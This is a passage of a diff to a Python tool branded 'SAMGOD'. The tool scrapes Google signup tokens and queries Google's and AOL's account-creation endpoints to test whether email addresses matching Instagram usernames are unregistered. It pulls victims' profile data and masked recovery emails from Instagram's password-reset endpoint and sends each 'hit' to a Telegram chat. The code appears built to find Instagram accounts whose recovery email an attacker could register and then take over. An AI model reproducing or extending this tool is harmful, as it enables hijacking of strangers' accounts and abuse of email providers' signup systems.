-        "Belçika": "\U0001f1e7\U0001f1ea", "\u0130svi\u00e7re": "\U0001f1e8\U0001f1ed",
-        "Avusturya": "\U0001f1e6\U0001f1f9", "\u0130sve\u00e7": "\U0001f1f8\U0001f1ea",
-        "Norve\u00e7": "\U0001f1f3\U0001f1f4", "Danimarka": "\U0001f1e9\U0001f1f0",
-        "Finlandiya": "\U0001f1eb\U0001f1ee", "Polonya": "\U0001f1f5\U0001f1f1",
-        "Rusya": "\U0001f1f7\U0001f1fa", "Ukrayna": "\U0001f1fa\U0001f1e6",
-        "Brezilya": "\U0001f1e7\U0001f1f7", "Meksika": "\U0001f1f2\U0001f1fd",
-        "Hindistan": "\U0001f1ee\U0001f1f3", "Japonya": "\U0001f1ef\U0001f1f5",
-        "G\u00fcney Kore": "\U0001f1f0\U0001f1f7", "Avustralya": "\U0001f1e6\U0001f1fa",
-        "Kanada": "\U0001f1e8\U0001f1e6", "M\u0131s\u0131r": "\U0001f1ea\U0001f1ec",
-        "Suudi Arabistan": "\U0001f1f8\U0001f1e6",
-        "Birle\u015fik Arap Emirlikleri": "\U0001f1e6\U0001f1ea",
-        "Katar": "\U0001f1f6\U0001f1e6", "Kuveyt": "\U0001f1f0\U0001f1fc",
-        "\u0130ran": "\U0001f1ee\U0001f1f7", "Yunanistan": "\U0001f1ec\U0001f1f7",
-        "Portekiz": "\U0001f1f5\U0001f1f9", "Romanya": "\U0001f1f7\U0001f1f4",
-        "Bulgaristan": "\U0001f1e7\U0001f1ec", "Macaristan": "\U0001f1ed\U0001f1fa",
-        "\u00c7ekya": "\U0001f1e8\U0001f1ff", "H\u0131rvatistan": "\U0001f1ed\U0001f1f7",
-        "S\u0131rbistan": "\U0001f1f7\U0001f1f8", "Arnavutluk": "\U0001f1e6\U0001f1f1",
-        "Kosova": "\U0001f1fd\U0001f1f0", "Malezya": "\U0001f1f2\U0001f1fe",
-        "Singapur": "\U0001f1f8\U0001f1ec", "Tayland": "\U0001f1f9\U0001f1ed",
-        "Vietnam": "\U0001f1fb\U0001f1f3", "Filipinler": "\U0001f1f5\U0001f1ed",
-        "\u00c7in": "\U0001f1e8\U0001f1f3", "Hong Kong": "\U0001f1ed\U0001f1f0",
-        "Tayvan": "\U0001f1f9\U0001f1fc", "G\u00fcrcistan": "\U0001f1ec\U0001f1ea",
-        "Azerbaycan": "\U0001f1e6\U0001f1ff", "Kazakistan": "\U0001f1f0\U0001f1ff",
-        "\u00d6zbekistan": "\U0001f1fa\U0001f1ff", "Pakistan": "\U0001f1f5\U0001f1f0",
-        "Banglade\u015f": "\U0001f1e7\U0001f1e9", "Kolombiya": "\U0001f1e8\U0001f1f4",
-        "\u015eili": "\U0001f1e8\U0001f1f1", "Peru": "\U0001f1f5\U0001f1ea",
-        "Venezuela": "\U0001f1fb\U0001f1ea", "G\u00fcney Afrika": "\U0001f1ff\U0001f1e6",
-        "Nijerya": "\U0001f1f3\U0001f1ec", "Kenya": "\U0001f1f0\U0001f1ea",
-        "Fas": "\U0001f1f2\U0001f1e6", "Tunus": "\U0001f1f9\U0001f1f3",
-        "Cezayir": "\U0001f1e9\U0001f1ff", "Libya": "\U0001f1f1\U0001f1fe",
-        "Sudan": "\U0001f1f8\U0001f1e9", "Etyopya": "\U0001f1ea\U0001f1f9",
-        "Gana": "\U0001f1ec\U0001f1ed", "Tanzanya": "\U0001f1f9\U0001f1ff",
-        "Uganda": "\U0001f1fa\U0001f1ec", "Kamerun": "\U0001f1e8\U0001f1f2",
-        "\u00dcrd\u00fcn": "\U0001f1ef\U0001f1f4", "L\u00fcbnan": "\U0001f1f1\U0001f1e7",
-        "Suriye": "\U0001f1f8\U0001f1fe", "Yemen": "\U0001f1fe\U0001f1ea",
-        "Umman": "\U0001f1f4\U0001f1f2", "Bahreyn": "\U0001f1e7\U0001f1ed",
-        "\u0130srail": "\U0001f1ee\U0001f1f1", "Filistin": "\U0001f1f5\U0001f1f8",
-        "Afganistan": "\U0001f1e6\U0001f1eb", "Sri Lanka": "\U0001f1f1\U0001f1f0",
-        "Nepal": "\U0001f1f3\U0001f1f5", "Myanmar": "\U0001f1f2\U0001f1f2",
-        "Kambo\u00e7ya": "\U0001f1f0\U0001f1ed", "Mo\u011folistan": "\U0001f1f2\U0001f1f3",
-        "K\u0131rg\u0131zistan": "\U0001f1f0\U0001f1ec",
-        "Tacikistan": "\U0001f1f9\U0001f1ef", "T\u00fcrkmenistan": "\U0001f1f9\U0001f1f2",
-        "Yeni Zelanda": "\U0001f1f3\U0001f1ff", "\u0130rlanda": "\U0001f1ee\U0001f1ea",
-        "Slovakya": "\U0001f1f8\U0001f1f0", "Slovenya": "\U0001f1f8\U0001f1ee",
-        "Bosna Hersek": "\U0001f1e7\U0001f1e6", "Karada\u011f": "\U0001f1f2\U0001f1ea",
-        "Kuzey Makedonya": "\U0001f1f2\U0001f1f0",
-        "Moldova": "\U0001f1f2\U0001f1e9", "Belarus": "\U0001f1e7\U0001f1fe",
-        "Litvanya": "\U0001f1f1\U0001f1f9", "Letonya": "\U0001f1f1\U0001f1fb",
-        "Estonya": "\U0001f1ea\U0001f1ea", "L\u00fcksemburg": "\U0001f1f1\U0001f1fa",
-        "Malta": "\U0001f1f2\U0001f1f9", "K\u0131br\u0131s": "\U0001f1e8\U0001f1fe",
-        "\u0130zlanda": "\U0001f1ee\U0001f1f8", "Ermenistan": "\U0001f1e6\U0001f1f2",
-        "Ekuador": "\U0001f1ea\U0001f1e8", "Bolivya": "\U0001f1e7\U0001f1f4",
-        "Paraguay": "\U0001f1f5\U0001f1fe", "Uruguay": "\U0001f1fa\U0001f1fe",
-        "K\u00fcba": "\U0001f1e8\U0001f1fa", "Dominik Cumhuriyeti": "\U0001f1e9\U0001f1f4",
-        "Haiti": "\U0001f1ed\U0001f1f9", "Porto Riko": "\U0001f1f5\U0001f1f7",
-        "Guatemala": "\U0001f1ec\U0001f1f9", "Honduras": "\U0001f1ed\U0001f1f3",
-        "El Salvador": "\U0001f1f8\U0001f1fb", "Nikaragua": "\U0001f1f3\U0001f1ee",
-        "Kosta Rika": "\U0001f1e8\U0001f1f7", "Panama": "\U0001f1f5\U0001f1e6",
-        "Trinidad ve Tobago": "\U0001f1f9\U0001f1f9", "Jamaika": "\U0001f1ef\U0001f1f2",
-    }
-    if country_name in flags:
-        return flags[country_name]
-    cl = country_name.lower()
-    for key in flags:
-        if key.lower() in cl or cl in key.lower():
-            return flags[key]
-    return ""
-
-
-# ── Google token helpers ──
+        pass
+    return False
 
 def _m1_gtokens_background():
     time.sleep(60)
@@ -792,296 +673,345 @@ def _m1_gtokens_background():
             pass
         time.sleep(90)
 
-def _m1_get_tl_background():
-    while True:
+
+# ── Gmail availability check ──
+
+def _m1_fresh_tl():
+    """
+    Fetch a fresh Google TL token inline — no file, no caching.
+    Returns (session, tl, host, ua) or (None, None, None, None).
+    Tries two strategies: the data-initial-setup-data pattern first,
+    then a minimal batchexecute call as fallback.
+    """
+    ua = random.choice(_M1_USER_AGENTS)
+    hdrs = {
+        "User-Agent": ua,
+        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
+        "Accept-Language": "en-GB,en;q=0.9",
+    }
+    # ── Strategy 1: hit the signup createaccount page ──────────────────────
+    for signup_url in [
+        ("https://accounts.google.com/signup/v2/createaccount"
+         "?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F"
+         "&theme=mn&flowName=GlifWebSignIn"),
+        ("https://accounts.google.com/signup/v2/createusername"
+         "?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F"
+         "&flowName=GlifWebSignIn"),
+    ]:
         try:
-            url    = "https://accounts.google.com/_/signup/validatepersonaldetails"
-            params = {'hl': "en-GB", '_reqid': "46000", 'rt': "j"}
-            payload = {
-                'continue': "https://accounts.google.com/ManageAccount?nc=1",
-                'f.req': "[\"AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl\",null,null,null,null,0,0,\"aesowns\",\"aesowns\",null,0,null,1,[],1]",
-                'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
-                'cookiesDisabled': "false",
-                'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
-                'gmscoreversion': "null", 'flowName': "GlifWebSignIn",
-                'checkConnection': "youtube:301", 'checkedDomains': "youtube",
-                'pstMsg': "1", '': ""
-            }
-            hdrs = {
-                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-                'x-same-domain': "1", 'google-accounts-xsrf': "1",
-                'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': "\"Android\"",
-                'origin': "https://accounts.google.com",
-                'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors",
-                'sec-fetch-dest': "empty",
-                'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
-                'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-                'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
-            }
-            response = _m1__session.post(url, params=params, data=payload, headers=hdrs, timeout=20)
-            tl_1 = json.loads(response.text[5:])[0][1][2]
-            url2 = "https://accounts.google.com/_/signup/validatebasicinfo"
-            p2   = {'hl': "en-GB", 'TL': tl_1, '_reqid': "346000", 'rt': "j"}
-            pl2  = dict(payload)
-            pl2['f.req'] = "[\"TL:"+ tl_1 +"\",2015,4,15,2,null,null,0,null,null,0,0]"
-            hdrs['referer'] = "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl_1
-            response2 = _m1__session.post(url2, params=p2, data=pl2, headers=hdrs, timeout=20)
-            tl = json.loads(response2.text[5:])[0][0][4].split("TL:")[1]
-            with open("google.txt", "w") as wf:
-                wf.write(tl)
+            sess = requests.Session()
+            r = sess.get(signup_url, headers=hdrs, timeout=12)
+            # Pattern A — data-initial-setup-data with quoted TL at end
+            m = re.search(
+                r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,'
+                r'&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
+                r.text
+            )
+            if m:
+                tl   = m.group(2)
+                host = sess.cookies.get("__Host-GAPS",
+                       "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=22)))
+                return sess, tl, host, ua
+            # Pattern B — plain "TL" JSON key
+            m2 = re.search(r'"TL"\s*:\s*"([^"]{10,})"', r.text)
+            if m2:
+                tl   = m2.group(1)
+                host = sess.cookies.get("__Host-GAPS",
+                       "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=22)))
+                return sess, tl, host, ua
+            # Pattern C — TL: inside any quoted string
+            m3 = re.search(r'["\']TL:([A-Za-z0-9_\-]{10,})["\']', r.text)
+            if m3:
+                tl   = m3.group(1)
+                host = sess.cookies.get("__Host-GAPS",
+                       "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=22)))
+                return sess, tl, host, ua
         except Exception:
             pass
-        time.sleep(120)
-
-def _m1_gtokens():
-    max_retries = 2
-    endpoint = "/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
-    abc = 'abcdefghijklmnopqrstuvwxyz'
-    for attempt in range(max_retries + 1):
-        try:
-            n1   = ''.join(choice(abc) for _ in range(randrange(6, 9)))
-            n2   = ''.join(choice(abc) for _ in range(randrange(3, 9)))
-            host = ''.join(choice(abc) for _ in range(randrange(15, 30)))
-            hdrs = {
-                'accept': '*/*', 'accept-language': 'en-GB,en;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                'google-accounts-xsrf': '1',
-                'user-agent': random.choice(_M1_USER_AGENTS)
-            }
-            res1 = requests.get(f"{_M1_CONFIG['google_url']}{endpoint}", headers=hdrs)
-            if res1.status_code != 200:
-                continue
-            tok = re.search(
-                r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
-                res1.text
-            )
-            if not tok:
-                continue
-            tl = tok.group(2)
-            cookies = {'__Host-GAPS': host}
-            hdrs.update({
-                'authority': 'accounts.google.com',
-                'origin': _M1_CONFIG["google_url"],
-                'referer': f"{_M1_CONFIG['google_url']}/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
-                'user-agent': random.choice(_M1_USER_AGENTS)
-            })
-            data = {
-                'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
-                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
-            }
-            response = requests.post(
-                f"{_M1_CONFIG['google_url']}/_/signup/validatepersonaldetails",
-                cookies=cookies, headers=hdrs, data=data
-            )
-            tl_new = response.text.split('",null,"')[1].split('"')[0] if '",null,"' in response.text else None
-            if tl_new:
-                tl = tl_new
-            host = response.cookies.get_dict().get('__Host-GAPS', host)
-            with open(_M1_CONFIG["token_file"], 'w') as f:
-                f.write(f"{tl}//{host}\n")
-            return True
-        except Exception:
-            continue
+    # ── Strategy 2: batchexecute to pull TL ────────────────────────────────
     try:
+        fake = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=18))
         hdrs2 = {
-            'accept': '*/*', 'accept-language': 'en',
-            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-            'origin': 'https://accounts.google.com',
-            'referer': 'https://accounts.google.com/',
-            'user-agent': random.choice(_M1_USER_AGENTS),
-            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
-            'x-same-domain': '1'
+            "User-Agent": ua,
+            "accept": "*/*",
+            "accept-language": "en",
+            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+            "origin": "https://accounts.google.com",
+            "referer": "https://accounts.google.com/",
+            "x-same-domain": "1",
         }
-        params2 = {'rpcids': 'NHJMOd', 'source-path': '/lifecycle/steps/signup/username', 'hl': 'en'}
-        em2   = ''.join(choice('abcdefghijklmnopqrstuvwxyz1234567890.') for _ in range(randrange(16, 26)))
-        data2 = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{em2}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
-        resp2 = requests.post(
-            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
-            params=params2, headers=hdrs2, data=data2
+        data2 = (
+            f"f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake}%5C%22%2C0%2C0%2C1%2C"
+            f"%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D"
         )
-        tl_match = re.search(r'"TL:([^"]+)"', resp2.text)
-        if tl_match:
-            tl   = tl_match.group(1)
-            host = ''.join(choice(abc) for _ in range(randrange(15, 30)))
-            with open(_M1_CONFIG["token_file"], 'w') as f:
-                f.write(f"{tl}//{host}\n")
-            return True
+        sess2 = requests.Session()
+        r2 = sess2.post(
+            "https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute",
+            params={"rpcids": "NHJMOd", "source-path": "/lifecycle/steps/signup/username", "hl": "en"},
+            headers=hdrs2, data=data2, timeout=12
+        )
+        m4 = re.search(r'"TL:([^"]{10,})"', r2.text)
+        if m4:
+            tl   = m4.group(1)
+            host = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=22))
+            return sess2, tl, host, ua
     except Exception:
         pass
-    return False
+    return None, None, None, None
 
 
-# ── Core scanning functions ──
+def _m1_cgmail(username, user, token, chat_id, loc_session):
+    global _m1_bad_email
+    try:
+        sess, tl, host, ua = _m1_fresh_tl()
+        if not tl:
+            _m1_bad_email += 1
+            return
+        cookies = {"__Host-GAPS": host}
+        headers = {
+            "authority": "accounts.google.com",
+            "accept": "*/*",
+            "accept-language": "en-US,en;q=0.9",
+            "content-type": _M1_FORM_TYPE,
+            "google-accounts-xsrf": "1",
+            "origin": _M1_GOOGLE_URL,
+            "referer": (
+                f"https://accounts.google.com/signup/v2/createusername"
+                f"?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}"
+            ),
+            "user-agent": ua,
+        }
+        data = (
+            "continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0"
+            "&flowEntry=SignUp&service=mail&theme=mn"
+            f"&f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
+            "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
+            "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull"
+            "%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull"
+            "%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined"
+            "&flowName=GlifWebSignIn&"
+        )
+        client = sess if sess else requests.Session()
+        resp = client.post(
+            f"{_M1_GOOGLE_URL}/_/signup/usernameavailability",
+            params={"TL": tl},
+            cookies=cookies,
+            headers=headers,
+            data=data,
+            timeout=12,
+        )
+        if '"gf.uar",1' in resp.text:
+            _m1_save_hit(username, "gmail.com", user, token, chat_id)
+        else:
+            _m1_bad_email += 1
+    except Exception:
+        _m1_bad_email += 1
 
-def _m1_masked_matches_username(username, masked):
-    """
-    Return True only if the masked email from Instagram confirms it is
-    username@gmail.com.
 
-    Instagram masks like: shoping5857 → s*******7@gmail.com
-    We verify:
-      1. Domain is @gmail.com
-      2. First visible char of masked local == first char of username
-      3. Last visible char of masked local  == last  char of username
-    """
-    if not masked or '@' not in masked:
-        return False
-    local, domain = masked.lower().rsplit('@', 1)
-    if 'gmail.com' not in domain:
-        return False
-    uname = username.lower()
-    if not uname:
-        return False
-    # first char
-    if local[0] != uname[0]:
-        return False
-    # last visible char (skip trailing asterisks)
-    last_visible = None
-    for ch in reversed(local):
-        if ch != '*':
-            last_visible = ch
-            break
-    if last_visible is None:
-        return False
-    if last_visible != uname[-1]:
-        return False
-    return True
+# ── AOL availability check ──
+
+def _m1_caol(username, user, token, chat_id, loc_session):
+    global _m1_bad_email
+    try:
+        s = requests.Session()
+        create_url = (
+            "https://login.aol.com/account/create?specId=yidregsimplified&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3F"
+            "activity%3Dheader-signin%26client_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--"
+        )
+        headers = {
+            "authority": "login.aol.com",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "user-agent": random.choice(_M1_WEB_USER_AGENTS),
+            "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
+        }
+        r1 = s.get(create_url, headers=headers, timeout=10)
+        specId_match       = re.search(r'name="specId" value="([^"]+)"', r1.text)
+        acrumb_match       = re.search(r'name="acrumb" value="([^"]+)"', r1.text)
+        sessionIndex_match = re.search(r'name="sessionIndex" value="([^"]+)"', r1.text)
+        if not (specId_match and acrumb_match and sessionIndex_match):
+            _m1_bad_email += 1
+            return
+        specId       = specId_match.group(1)
+        acrumb       = acrumb_match.group(1)
+        sessionIndex = sessionIndex_match.group(1)
+        validate_url = "https://login.aol.com/account/module/validate"
+        data = {
+            "specId": specId,
+            "acrumb": acrumb,
+            "sessionIndex": sessionIndex,
+            "userId": username,
+            "validateField": "userId"
+        }
+        headers2 = {
+            "authority": "login.aol.com",
+            "accept": "*/*",
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "origin": "https://login.aol.com",
+            "referer": create_url,
+            "user-agent": random.choice(_M1_WEB_USER_AGENTS),
+            "x-requested-with": "XMLHttpRequest",
+        }
+        r2 = s.post(validate_url, headers=headers2, data=data, timeout=10)
+        if r2.status_code == 200:
+            try:
+                json_resp    = r2.json()
+                userId_field = json_resp.get("fields", {}).get("userId", {})
+                if "error" not in userId_field:
+                    _m1_save_hit(username, "aol.com", user, token, chat_id)
+                    return
+            except Exception:
+                if "IDENTIFIER_AVAILABLE" in r2.text or '"errors":[]' in r2.text:
+                    _m1_save_hit(username, "aol.com", user, token, chat_id)
+                    return
+        _m1_bad_email += 1
+    except Exception:
+        _m1_bad_email += 1
 
 
-def _m1_save_hit(username, user, token, chat_id):
+# ── Country flag helper ──
+
+def _m1_get_country_flag(country_name):
+    if not country_name or country_name in ["-", "Paylasilmadi", "None", ""]:
+        return ""
+    flags = {
+        "Turkiye": "\U0001f1f9\U0001f1f7", "Irak": "\U0001f1ee\U0001f1f6",
+        "Fransa": "\U0001f1eb\U0001f1f7", "Endonezya": "\U0001f1ee\U0001f1e9",
+        "Arjantin": "\U0001f1e6\U0001f1f7", "Almanya": "\U0001f1e9\U0001f1ea",
+        "Amerika Birlesik Devletleri": "\U0001f1fa\U0001f1f8",
+        "Birlesik Krallik": "\U0001f1ec\U0001f1e7",
+        "Ingiltere": "\U0001f1ec\U0001f1e7", "Italya": "\U0001f1ee\U0001f1f9",
+        "Ispanya": "\U0001f1ea\U0001f1f8", "Hollanda": "\U0001f1f3\U0001f1f1",
+        "Avusturya": "\U0001f1e6\U0001f1f9", "Norveç": "\U0001f1f3\U0001f1f4",
+        "Danimarka": "\U0001f1e9\U0001f1f0", "Finlandiya": "\U0001f1eb\U0001f1ee",
+        "Polonya": "\U0001f1f5\U0001f1f1", "Rusya": "\U0001f1f7\U0001f1fa",
+        "Ukrayna": "\U0001f1fa\U0001f1e6", "Brezilya": "\U0001f1e7\U0001f1f7",
+        "Meksika": "\U0001f1f2\U0001f1fd", "Hindistan": "\U0001f1ee\U0001f1f3",
+        "Japonya": "\U0001f1ef\U0001f1f5", "Guney Kore": "\U0001f1f0\U0001f1f7",
+        "Avustralya": "\U0001f1e6\U0001f1fa", "Kanada": "\U0001f1e8\U0001f1e6",
+        "Misir": "\U0001f1ea\U0001f1ec", "Suudi Arabistan": "\U0001f1f8\U0001f1e6",
+        "Birlesik Arap Emirlikleri": "\U0001f1e6\U0001f1ea",
+        "Katar": "\U0001f1f6\U0001f1e6", "Kuveyt": "\U0001f1f0\U0001f1fc",
+        "Yunanistan": "\U0001f1ec\U0001f1f7", "Portekiz": "\U0001f1f5\U0001f1f9",
+        "Romanya": "\U0001f1f7\U0001f1f4", "Bulgaristan": "\U0001f1e7\U0001f1ec",
+        "Macaristan": "\U0001f1ed\U0001f1fa", "Malezya": "\U0001f1f2\U0001f1fe",
+        "Singapur": "\U0001f1f8\U0001f1ec", "Tayland": "\U0001f1f9\U0001f1ed",
+        "Vietnam": "\U0001f1fb\U0001f1f3", "Filipinler": "\U0001f1f5\U0001f1ed",
+        "Pakistan": "\U0001f1f5\U0001f1f0", "Nijerya": "\U0001f1f3\U0001f1ec",
+        "Kenya": "\U0001f1f0\U0001f1ea", "Fas": "\U0001f1f2\U0001f1e6",
+        "Tunus": "\U0001f1f9\U0001f1f3", "Cezayir": "\U0001f1e9\U0001f1ff",
+        "Libya": "\U0001f1f1\U0001f1fe", "Sudan": "\U0001f1f8\U0001f1e9",
+        "Gana": "\U0001f1ec\U0001f1ed", "Suriye": "\U0001f1f8\U0001f1fe",
+        "Yemen": "\U0001f1fe\U0001f1ea", "Filistin": "\U0001f1f5\U0001f1f8",
+        "Afganistan": "\U0001f1e6\U0001f1eb", "Sri Lanka": "\U0001f1f1\U0001f1f0",
+        "Nepal": "\U0001f1f3\U0001f1f5", "Myanmar": "\U0001f1f2\U0001f1f2",
+        "Yeni Zelanda": "\U0001f1f3\U0001f1ff",
+        "Bosna Hersek": "\U0001f1e7\U0001f1e6", "Moldova": "\U0001f1f2\U0001f1e9",
+        "Belarus": "\U0001f1e7\U0001f1fe", "Litvanya": "\U0001f1f1\U0001f1f9",
+        "Letonya": "\U0001f1f1\U0001f1fb", "Ermenistan": "\U0001f1e6\U0001f1f2",
+        "Jamaika": "\U0001f1ef\U0001f1f2",
+    }
+    if country_name in flags:
+        return flags[country_name]
+    country_lower = country_name.lower()
+    for key in flags:
+        if key.lower() in country_lower or country_lower in key.lower():
+            return flags[key]
+    return ""
+
+
+# ── Hit saver (SAMGOD format) ──
+
+def _m1_save_hit(username, domain, user, token, chat_id):
     global _m1_hits, _m1_total, _m1_found_emails
 
-    # ── All network calls run OUTSIDE the lock so threads don't queue up ──────
-    user_id    = user.get('pk', 'Unknown')
-    followers  = user.get('follower_count', 0)
-    following  = user.get('following_count', 0)
-    bio        = user.get('biography', 'None') or 'None'
-    email_str  = f"{username}@gmail.com"
+    user_id    = user.get("pk", "Unknown")
+    followers  = user.get("follower_count", 0) or 0
+    followings = user.get("following_count", 0) or 0
+    posts      = user.get("media_count", 0) or 0
+    name       = user.get("full_name", "None") or "None"
+    bio        = (user.get("biography", "") or "")[:50]
+    business   = user.get("is_business", False)
+    year       = str(gdate(user_id))
+    email_str  = f"{username}@{domain}"
+    meta       = "True" if posts > 2 else "False"
 
-    # Fetch reset-endpoint masked email
-    reset_text = _m1_rest_v1(username)
-    if not (reset_text and reset_text not in ('-', '') and not reset_text.startswith('Fail:') and '@' in reset_text):
-        reset_text = email_str
+    reset_mask = _m1_rest_v1(username)
 
-    output = format_hit(
-        hit_num    = 0,          # placeholder; replaced inside the lock below
-        username   = username,
-        email      = email_str,
-        followers  = followers,
-        following  = following,
-        bio        = bio,
-        reset_text = reset_text,
-    )
+    about          = _m1_get_about_account(user_id, username)
+    join_date      = about.get("join_date") or year
+    country_name   = about.get("country") or "-"
+    country_flag   = _m1_get_country_flag(country_name)
+    country_display = f"{country_name} {country_flag}".strip() if country_flag else country_name
+    former_usernames = ", ".join(about.get("former_usernames", [])) or "-"
 
-    # ── Lock only for counter update + hit number assignment ─────────────────
     with _m1_hit_lock:
         _m1_hits  += 1
         _m1_total += 1
         hit_num    = _m1_hits
 
-    # Patch the placeholder hit number into the already-built output string
-    output = output.replace("HIT #0", f"HIT #{hit_num}", 1)
+    box = (
+        "\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "ᡣ 𐭩 SAMGOD 🔱 SEND A HIT ᡣ 𐭩\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"❍ Business : {business}\n"
+        f"❍ Meta     : {meta}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "≿━━━━━━༺ Tool By SAMGOD 🔱 ༻━━━━━━≾\n"
+        f"[ ✰ ] Hit #        ➺ {hit_num}\n"
+        f"[ ✰ ] Name         ➺ {name}\n"
+        f"[ ✰ ] Username     ➺ @{username}\n"
+        f"[ ✰ ] Domain       ➺ {domain}\n"
+        f"[ ✰ ] Followers    ➺ {followers}\n"
+        f"[ ✰ ] Following    ➺ {followings}\n"
+        f"[ ✰ ] Posts        ➺ {posts}\n"
+        f"[ ✰ ] Bio          ➺ {bio}\n"
+        f"[ ✰ ] Email        ➺ {email_str}\n"
+        f"[ ✰ ] Attached     ➺ {reset_mask}\n"
+        f"[ ✰ ] Year         ➺ {year}\n"
+        f"[ ✰ ] Join Date    ➺ {join_date}\n"
+        f"[ ✰ ] Country      ➺ {country_display}\n"
+        f"[ ✰ ] Former Users ➺ {former_usernames}\n"
+        f"[ ✰ ] Portfolio    ➺ https://instagram.com/{username}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "     Promotion: SAMGOD 🔱\n"
+    )
 
     with _m1_found_lock:
         if email_str not in _m1_found_emails:
             _m1_found_emails.append(email_str)
-    _send_telegram(token, chat_id, output)
-    _save_hit_to_file(output)
+
+    _save_hit_to_file(box)
+    _send_telegram(token, chat_id, box)
+
     with _web_lock:
-        _web_state['hits']  = _m1_hits
-        _web_state['total'] = _m1_total
+        _web_state["hits"]  = _m1_hits
+        _web_state["total"] = _m1_total
 
-def _m1_cgmail(email, token, chat_id, user, loc_session):
-    global _m1_bad_email, _m1_taken
-    try:
-        usr = email.split('@')[0] if '@' in email else email
-        # Method 1: tokens.txt TL
-        try:
-            with open(_M1_CONFIG["token_file"], 'r') as f:
-                line = f.read().splitlines()[0]
-                tl, host = line.split('//')
-            cookies = {'__Host-GAPS': host}
-            headers = {
-                'authority': 'accounts.google.com', 'accept': '*/*',
-                'accept-language': 'en-US,en;q=0.9',
-                'content-type': _M1_CONFIG["form_type"],
-                'google-accounts-xsrf': '1',
-                'origin': _M1_CONFIG["google_url"],
-                'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
-                'user-agent': random.choice(_M1_USER_AGENTS)
-            }
-            params = {'TL': tl}
-            data = (
-                f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
